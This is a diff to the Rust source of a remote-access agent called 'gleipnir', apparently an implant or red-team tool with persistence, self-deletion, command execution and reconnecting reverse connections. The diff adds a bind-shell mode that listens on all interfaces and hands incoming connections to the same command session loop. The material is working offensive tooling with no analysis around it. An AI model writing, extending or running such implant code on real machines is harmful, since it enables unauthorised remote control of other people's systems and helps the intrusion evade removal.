@@ -1,3 +1,4 @@
+mod bind;
 mod connect;
 mod executor;
 mod persist;
@@ -61,6 +62,14 @@ struct Cli {
     #[arg(long)]
     self_delete: bool,
 
+    /// Listen for incoming connections instead of connecting out (bind shell mode)
+    #[arg(long)]
+    bind: bool,
+
+    /// Bind address for bind mode (default: 0.0.0.0)
+    #[arg(long, default_value = "0.0.0.0")]
+    bind_addr: String,
+
     /// Stable session identifier for reconnect resume (auto-generated if omitted)
     #[arg(long)]
     session_id: Option<String>,
@@ -116,30 +125,61 @@ async fn main() {
     }
 
     let session_id = platform::resolve_session_id(cli.session_id);
-    info!(
-        "gleipnir agent starting, targets {:?}:{}, session_id={}",
-        cli.host, cli.port, session_id
-    );
-
-    let config = ConnectConfig {
-        hosts: cli.host,
-        port: cli.port,
-        max_retry_interval: cli.max_retry_interval,
-        #[cfg(feature = "tls")]
-        tls: if cli.tls {
-            Some(connect::build_tls_config(cli.tls_ca.as_deref()))
-        } else {
-            None
-        },
-    };
     let cmd_timeout = cli.cmd_timeout;
-    let sid = session_id.clone();
 
-    connect::connect_loop(&config, move |framed| {
-        let sid = sid.clone();
-        tokio::spawn(session_loop(framed, cmd_timeout, sid))
-    })
-    .await;
+    if cli.bind {
+        info!(
+            "gleipnir agent starting in bind mode on {}:{}, session_id={}",
+            cli.bind_addr, cli.port, session_id
+        );
+
+        let bind_config = bind::BindConfig {
+            addr: cli.bind_addr,
+            port: cli.port,
+            #[cfg(feature = "tls")]
+            tls: if cli.tls {
+                Some(bind::generate_self_signed_tls())
+            } else {
+                None
+            },
+        };
+        let sid = session_id.clone();
+
+        bind::bind_loop(&bind_config, move |framed| {
+            let sid = sid.clone();
+            tokio::spawn(session_loop(framed, cmd_timeout, sid))
+        })
+        .await;
+    } else {
+        if cli.host.is_empty() {
+            eprintln!("error: --host is required in connect mode (omit --bind)");
+            std::process::exit(1);
+        }
+
+        info!(
+            "gleipnir agent starting, targets {:?}:{}, session_id={}",
+            cli.host, cli.port, session_id
+        );
+
+        let config = ConnectConfig {
+            hosts: cli.host,
+            port: cli.port,
+            max_retry_interval: cli.max_retry_interval,
+            #[cfg(feature = "tls")]
+            tls: if cli.tls {
+                Some(connect::build_tls_config(cli.tls_ca.as_deref()))
+            } else {
+                None
+            },
+        };
+        let sid = session_id.clone();
+
+        connect::connect_loop(&config, move |framed| {
+            let sid = sid.clone();
+            tokio::spawn(session_loop(framed, cmd_timeout, sid))
+        })
+        .await;
+    }
 }
 
 async fn session_loop(
